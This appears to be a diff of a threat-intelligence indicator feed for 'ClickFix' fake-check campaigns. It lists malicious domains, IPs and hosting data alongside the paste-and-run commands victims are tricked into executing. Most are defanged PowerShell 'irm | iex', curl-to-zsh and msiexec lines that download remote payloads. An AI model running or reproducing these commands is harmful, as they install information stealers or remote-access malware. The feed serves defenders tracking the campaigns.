@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 4981,
+ "count": 4979,
  "indicators": [
   {
    "indicator": "1.15.58.123",
@@ -567,17 +567,17 @@
    "country": null,
    "ips": [
     {
-     "ip": "104.21.74.189",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-03",
-     "last_seen": "2026-11-10"
-    },
-    {
      "ip": "172.67.162.93",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-02",
+     "last_seen": "2026-11-10"
+    },
+    {
+     "ip": "104.21.74.189",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-03",
      "last_seen": "2026-11-10"
     },
     {
@@ -719,6 +719,7 @@
     "efreitorher.org",
     "yaebalciganovvjopu.org",
     "pizdalisibivet.org",
+    "yaponovosh.org",
     "ciganshina.org",
     "pakistanskimalchik.org"
    ]
@@ -8947,20 +8948,20 @@
    "product": null,
    "hosting": "Hostinger",
    "dns": "dns-parking.com",
-   "ip": "2a02:4780:11:1217:0:2928:197c:8",
+   "ip": "193.203.185.112",
    "asn": "AS47583",
    "org": "AS-HOSTINGER Hostinger International Limited, CY",
    "country": "IN",
    "ips": [
     {
-     "ip": "2a02:4780:11:1217:0:2928:197c:8",
+     "ip": "193.203.185.112",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-10-28",
      "last_seen": "2026-11-10"
     },
     {
-     "ip": "193.203.185.112",
+     "ip": "2a02:4780:11:1217:0:2928:197c:8",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-10-28",
@@ -10374,8 +10375,8 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
-    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null"
    ],
    "connects_to": [
     "xorados.com",
@@ -10383,8 +10384,8 @@
     "trek-72.com",
     "hagosuro.lc",
     "groverudder12.com",
-    "trustchecknes.com",
-    "t-trustresnew.com"
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at",
@@ -13584,6 +13585,71 @@
    ],
    "connects_to": [],
    "lure_from": []
+  },
+  {
+   "indicator": "agerefineclinic.com",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-10-20",
+   "last_seen": "2026-11-01",
+   "last_online": "2026-11-10",
+   "offline_since": null,
+   "url": "https://agerefineclinic.com/",
+   "brand": null,
+   "product": null,
+   "hosting": "IONOS",
+   "dns": "IONOS",
+   "ip": "74.208.236.170",
+   "asn": "AS8560",
+   "org": "IONOS-AS IONOS SE, DE",
+   "country": "US",
+   "ips": [
+    {
+     "ip": "74.208.236.170",
+     "asn": "AS8560",
+     "org": "IONOS-AS IONOS SE, DE",
+     "first_seen": "2026-10-20",
+     "last_seen": "2026-11-01"
+    },
+    {
+     "ip": "2607:f1c0:100f:f000::200",
+     "asn": "AS8560",
+     "org": "IONOS-AS IONOS SE, DE",
+     "first_seen": "2026-10-21",
+     "last_seen": "2026-10-22"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "agerefineclinic.com",
+     "status": "online",
+     "first_seen": "2026-10-20",
+     "last_seen": "2026-11-01"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
+   ],
+   "connects_to": [
+    "t-trustrest.com",
+    "xorados.com",
+    "trek-72.com",
+    "hagosuro.lc",
+    "lepafonso.bz",
+    "t-trustresnew.com",
+    "trustchecknes.com"
+   ],
+   "lure_from": [
+    "interseq.at"
+   ]
   },
   {
    "indicator": "agla.lv",
@@ -39011,13 +39077,13 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
-    "trustchecknes.com",
-    "t-trustresnew.com"
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -41184,13 +41250,13 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
-    "trustchecknes.com",
-    "t-trustresnew.com"
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -43407,13 +43473,13 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
-    "trustchecknes.com",
-    "t-trustresnew.com"
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -43922,13 +43988,13 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
-    "trustchecknes.com",
-    "t-trustresnew.com"
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -46409,13 +46475,13 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
-    "trustchecknes.com",
-    "t-trustresnew.com"
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -46492,7 +46558,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-04",
-   "last_seen": "2026-11-09",
+   "last_seen": "2026-11-10",
    "last_online": "2026-11-10",
    "offline_since": null,
    "url": "https://buccarella-sicherheit.ch/",
@@ -46500,23 +46566,23 @@
    "product": null,
    "hosting": "Namecheap",
    "dns": "Namecheap",
-   "ip": "63.250.43.14",
+   "ip": "63.250.43.13",
    "asn": "AS22612",
    "org": "NAMECHEAP-NET - Namecheap, Inc., US",
    "country": "US",
    "ips": [
     {
-     "ip": "63.250.43.14",
-     "asn": "AS22612",
-     "org": "NAMECHEAP-NET - Namecheap, Inc., US",
-     "first_seen": "2026-11-04",
-     "last_seen": "2026-11-09"
-    },
-    {
      "ip": "63.250.43.13",
      "asn": "AS22612",
      "org": "NAMECHEAP-NET - Namecheap, Inc., US",
      "first_seen": "2026-11-05",
+     "last_seen": "2026-11-10"
+    },
+    {
+     "ip": "63.250.43.14",
+     "asn": "AS22612",
+     "org": "NAMECHEAP-NET - Namecheap, Inc., US",
+     "first_seen": "2026-11-04",
      "last_seen": "2026-11-09"
     }
    ],
@@ -46525,7 +46591,7 @@
      "host": "buccarella-sicherheit.ch",
      "status": "online",
      "first_seen": "2026-11-04",
-     "last_seen": "2026-11-09"
+     "last_seen": "2026-11-10"
     }
    ],
    "actor": null,
@@ -47939,13 +48005,13 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
-    "trustchecknes.com",
-    "t-trustresnew.com"
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -47994,13 +48060,13 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
-    "trustchecknes.com",
-    "t-trustresnew.com"
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -49043,8 +49109,8 @@
     "efreitorher.org",
     "yaebalciganovvjopu.org",
     "pizdalisibivet.org",
-    "ktoktotam.cc",
-    "ciganshina.org"
+    "yaponovosh.org",
+    "ktoktotam.cc"
    ]
   },
   {
@@ -60438,7 +60504,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "172.67.199.221",
+   "ip": "2606:4700:3030::ac43:c7dd",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -64512,64 +64578,6 @@
    ]
   },
   {
-   "indicator": "cosmomarket.pl",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-20",
-   "last_seen": "2026-10-20",
-   "last_online": "2026-11-10",
-   "offline_since": null,
-   "url": "https://cosmomarket.pl/",
-   "brand": null,
-   "product": null,
-   "hosting": "PL AS48707 OPS PL sp. z o.o.",
-   "dns": "aftermarket.hosting",
-   "ip": "185.253.215.16",
-   "asn": "AS48707",
-   "org": "AS48707-OPS-PL AS48707 OPS PL sp. z o.o., PL",
-   "country": "PL",
-   "ips": [
-    {
-     "ip": "185.253.215.16",
-     "asn": "AS48707",
-     "org": "AS48707-OPS-PL AS48707 OPS PL sp. z o.o., PL",
-     "first_seen": "2026-10-20",
-     "last_seen": "2026-10-20"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "cosmomarket.pl",
-     "status": "online",
-     "first_seen": "2026-10-20",
-     "last_seen": "2026-10-20"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
-   ],
-   "connects_to": [
-    "xorados.com",
-    "t-trustrest.com",
-    "groverudder12.com",
-    "hagosuro.lc",
-    "trek-72.com",
-    "lepafonso.bz",
-    "trustchecknes.com"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
-  },
-  {
    "indicator": "cosmospaintingllc.com",
    "type": "domain",
    "category": "clickfix",
@@ -67092,73 +67100,6 @@
     "interseq.at",
     "id-verfied.boats",
     "ncheck-brows.beer"
-   ]
-  },
-  {
-   "indicator": "cuauhtv.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-20",
-   "last_seen": "2026-11-05",
-   "last_online": "2026-11-10",
-   "offline_since": null,
-   "url": "https://cuauhtv.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "Cloudflare (proxied)",
-   "dns": "Cloudflare",
-   "ip": "188.114.96.3",
-   "asn": "AS13335",
-   "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-   "country": null,
-   "ips": [
-    {
-     "ip": "188.114.96.3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-10-20",
-     "last_seen": "2026-11-05"
-    },
-    {
-     "ip": "2a06:98c1:3121::3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-10-21",
-     "last_seen": "2026-11-05"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "cuauhtv.com",
-     "status": "online",
-     "first_seen": "2026-10-20",
-     "last_seen": "2026-11-05"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "iex(irm 'hxxps[:]//gfisoda[.]biz/01/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})",
-    "msiexec /q /i hxxps[:]//distnode[.]biz/clone-sleek-crisp/struct",
-    "cmd /c \"curl -s -o NUL hxxps[:]//xedplay[.]com/verify.php?t=[id] & msiexec /q /i hxxps[:]//distnode[.]biz/radar-cover-probe/named\""
-   ],
-   "connects_to": [
-    "gfisoda.biz",
-    "distnode.biz",
-    "xedplay.com"
-   ],
-   "lure_from": [
-    "interseq.at",
-    "nikogdatakonebilo.cc",
-    "efreitorher.org",
-    "yaebalciganovvjopu.org",
-    "ktoktotam.cc",
-    "ciganshina.org",
-    "pakistanskimalchik.org"
    ]
   },
   {
@@ -86833,25 +86774,11 @@
    "product": null,
    "hosting": "Hostinger",
    "dns": "dns-parking.com",
-   "ip": "2a02:4780:84:f820:c365:1472:9881:4bcf",
+   "ip": "84.32.84.88",
    "asn": "AS47583",
    "org": "AS-HOSTINGER Hostinger International Limited, CY",
-   "country": "CY",
+   "country": "LT",
    "ips": [
-    {
-     "ip": "2a02:4780:43:6d48:f984:89e7:a0c3:b928",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-04",
-     "last_seen": "2026-11-10"
-    },
-    {
-     "ip": "2a02:4780:84:f820:c365:1472:9881:4bcf",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-04",
-     "last_seen": "2026-11-10"
-    },
     {
      "ip": "2a02:4780:42:6ff6:b5ff:4deb:65fc:2bea",
      "asn": "AS47583",
@@ -86864,6 +86791,20 @@
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-08",
+     "last_seen": "2026-11-10"
+    },
+    {
+     "ip": "2a02:4780:43:6d48:f984:89e7:a0c3:b928",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-04",
+     "last_seen": "2026-11-10"
+    },
+    {
+     "ip": "2a02:4780:84:f820:c365:1472:9881:4bcf",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-04",
      "last_seen": "2026-11-10"
     },
     {
@@ -91459,10 +91400,10 @@
    "product": null,
    "hosting": "TWENTYI 20i Limited",
    "dns": "stackdns.com",
-   "ip": "185.146.167.193",
+   "ip": "2a07:7800::193",
    "asn": "AS48254",
    "org": "TWENTYI 20i Limited, GB",
-   "country": "US",
+   "country": "GB",
    "ips": [
     {
      "ip": "185.146.167.193",
@@ -91820,15 +91761,15 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "xorados.com",
     "trek-72.com",
+    "t-trustresnew.com",
     "trustchecknes.com",
-    "t-trustrest.com",
-    "t-trustresnew.com"
+    "t-trustrest.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -107869,32 +107810,11 @@
    "product": "Instagram",
    "hosting": "Hostinger",
    "dns": "dns-parking.com",
-   "ip": "2a02:4780:44:28a0:82f1:5785:a06f:9c69",
+   "ip": "2a02:4780:42:b56:1745:3e26:3496:88d5",
    "asn": "AS47583",
    "org": "AS-HOSTINGER Hostinger International Limited, CY",
    "country": "DE",
    "ips": [
-    {
-     "ip": "2a02:4780:44:28a0:82f1:5785:a06f:9c69",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-08",
-     "last_seen": "2026-11-10"
-    },
-    {
-     "ip": "88.222.222.232",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-08",
-     "last_seen": "2026-11-10"
-    },
-    {
-     "ip": "92.113.16.13",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-08",
-     "last_seen": "2026-11-10"
-    },
     {
      "ip": "2a02:4780:42:b56:1745:3e26:3496:88d5",
      "asn": "AS47583",
@@ -107924,7 +107844,21 @@
      "last_seen": "2026-11-10"
     },
     {
+     "ip": "88.222.222.232",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-08",
+     "last_seen": "2026-11-10"
+    },
+    {
      "ip": "92.113.16.113",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-08",
+     "last_seen": "2026-11-10"
+    },
+    {
+     "ip": "92.113.16.13",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-08",
@@ -107946,6 +107880,13 @@
     },
     {
      "ip": "92.113.23.52",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-08",
+     "last_seen": "2026-11-10"
+    },
+    {
+     "ip": "2a02:4780:44:28a0:82f1:5785:a06f:9c69",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-08",
@@ -145369,14 +145310,14 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
     "xorados.com",
     "trek-72.com",
-    "trustchecknes.com",
-    "t-trustresnew.com"
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -153746,14 +153687,14 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
-    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
+    "t-trustresnew.com",
     "trustchecknes.com",
-    "t-trustrest.com",
-    "t-trustresnew.com"
+    "t-trustrest.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -155104,59 +155045,6 @@
    "lure_from": []
   },
   {
-   "indicator": "mantrasoap.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-30",
-   "last_seen": "2026-11-01",
-   "last_online": "2026-11-10",
-   "offline_since": null,
-   "url": "https://mantrasoap.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "Hostinger",
-   "dns": "dns-parking.com",
-   "ip": "2a02:4780:11:1361:0:1972:aa93:9",
-   "asn": "AS47583",
-   "org": "AS-HOSTINGER Hostinger International Limited, CY",
-   "country": "IN",
-   "ips": [
-    {
-     "ip": "2a02:4780:11:1361:0:1972:aa93:9",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-10-30",
-     "last_seen": "2026-11-01"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "mantrasoap.com",
-     "status": "online",
-     "first_seen": "2026-10-30",
-     "last_seen": "2026-11-01"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "irm 'hxxps[:]//sfesfes[.]world/v2_6Elir-nmrce6LR0v=[id]' | iex;",
-    "irm 'hxxps[:]//sfesfes[.]world/v2__u6Kne-eQSReQIQO=[id]' | iex;",
-    "irm 'hxxps[:]//sfesfes[.]world/v2_a7D5OMNti13LhC4r=[id]' | iex;"
-   ],
-   "connects_to": [
-    "sfesfes.world",
-    "www.yaldram.com"
-   ],
-   "lure_from": [
-    "fddsc.motorcycles"
-   ]
-  },
-  {
    "indicator": "manuelagrund.de",
    "type": "domain",
    "category": "clickfix",
@@ -155253,15 +155141,15 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
     "xorados.com",
     "trek-72.com",
+    "t-trustresnew.com",
     "trustchecknes.com",
-    "t-trustrest.com",
-    "t-trustresnew.com"
+    "t-trustrest.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -157931,11 +157819,18 @@
    "product": "WhatsApp",
    "hosting": "Hostinger",
    "dns": "dns-parking.com",
-   "ip": "2a02:4780:43:8f3c:6cd4:57be:c677:a295",
+   "ip": "2.57.91.213",
    "asn": "AS47583",
    "org": "AS-HOSTINGER Hostinger International Limited, CY",
-   "country": "DE",
+   "country": "CY",
    "ips": [
+    {
+     "ip": "2.57.91.213",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-07",
+     "last_seen": "2026-11-10"
+    },
     {
      "ip": "191.101.104.180",
      "asn": "AS47583",
@@ -158011,13 +157906,6 @@
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-03",
-     "last_seen": "2026-11-10"
-    },
-    {
-     "ip": "2.57.91.213",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-07",
      "last_seen": "2026-11-10"
     },
     {
@@ -188618,9 +188506,12 @@
    "actor_link": null,
    "commands": [
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/b77d-[id] | IEX",
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL '2negqqog[.]citafm1[.]com/?ublib=9ca91746-7c34-4ae8-ac97-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
     "IRM c\"d\"n[.]jsdelivr[.]net/g\"h\"/adsr1163/49a6-8c52-[id]/[id] | IEX"
    ],
-   "connects_to": [],
+   "connects_to": [
+    "2negqqog.citafm1.com"
+   ],
    "lure_from": []
   },
   {
@@ -197958,7 +197849,8 @@
     "trek-72.com",
     "t-trustrest.com",
     "trustchecknes.com",
-    "groverudder12.com"
+    "groverudder12.com",
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -198041,11 +197933,18 @@
    "product": null,
    "hosting": "Hostinger",
    "dns": "dns-parking.com",
-   "ip": "2a02:4780:84:8e6a:e27d:9dbb:2d4a:6fba",
+   "ip": "84.32.84.211",
    "asn": "AS47583",
    "org": "AS-HOSTINGER Hostinger International Limited, CY",
-   "country": "CY",
+   "country": "LT",
    "ips": [
+    {
+     "ip": "84.32.84.211",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-09",
+     "last_seen": "2026-11-10"
+    },
     {
      "ip": "2.57.91.205",
      "asn": "AS47583",
@@ -198114,13 +198013,6 @@
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-03",
-     "last_seen": "2026-11-10"
-    },
-    {
-     "ip": "84.32.84.211",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-09",
      "last_seen": "2026-11-10"
     },
     {
@@ -234652,12 +234544,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "iex(irm 'hxxps[:]//cosmical2049[.]com/wordpresscheck/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})",
-    "(irm 'hxxps[:]//hagosuro[.]lc/wordpresscheck/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//hagosuro[.]lc/wordpresscheck/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
+    "iex(irm 'hxxps[:]//cosmical2049[.]com/wordpresscheck/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})"
    ],
    "connects_to": [
-    "cosmical2049.com",
-    "hagosuro.lc"
+    "hagosuro.lc",
+    "cosmical2049.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -242526,10 +242418,10 @@
     "hagosuro.lc",
     "trek-72.com",
     "lepafonso.bz",
+    "t-trustresnew.com",
     "trustchecknes.com",
     "groverudder12.com",
-    "t-trustrest.com",
-    "t-trustresnew.com"
+    "t-trustrest.com"
    ],
    "lure_from": [
     "interseq.at"
